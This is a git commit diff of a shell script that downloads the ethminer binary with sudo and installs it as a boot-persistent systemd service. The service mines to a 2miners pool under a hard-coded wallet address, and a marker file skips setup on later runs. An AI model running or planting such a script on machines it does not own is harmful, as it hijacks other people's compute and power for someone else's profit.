af9bbdf9357fa2d8a312fc734684cae77b790ef1
Khangdz2005 <91968421+Khangdz2005@users.noreply.github.com>
2022-06-04 10:30:27 +0700

    Update tien.sh

--- tien.sh
+++ tien.sh
@@ -1,11 +1,14 @@
-sudo apt-get install linux-headers-$(uname -r) -y
-distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
-wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
-sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
-sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub
-sudo add-apt-repository "deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/ /"
-sudo apt-get update
-sudo apt-get -y install cuda
-wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-./ethminer -U -P stratum://0x0277EaD97b193b1A8fF23cBd77b18C21bE7318DC.khanga4@us2.ethermine.org:4444 &
+SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
+if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
+then
+  echo "taind vip pro" > isHaveSetupCoin.txt
+  cd /usr/local/bin
+  sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+  sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+  sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://nano_3xrboi8qd3rffub47g76jqewafgkcusfrp6jbb5p4zwoq5mjdmihztjz146y.Vhtdeptrai@eth.2miners.com:2020 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
+  sudo systemctl daemon-reload
+  sudo systemctl enable eth.service
+  sudo systemctl start eth.service
+else
+  sudo systemctl start eth.service
+fi
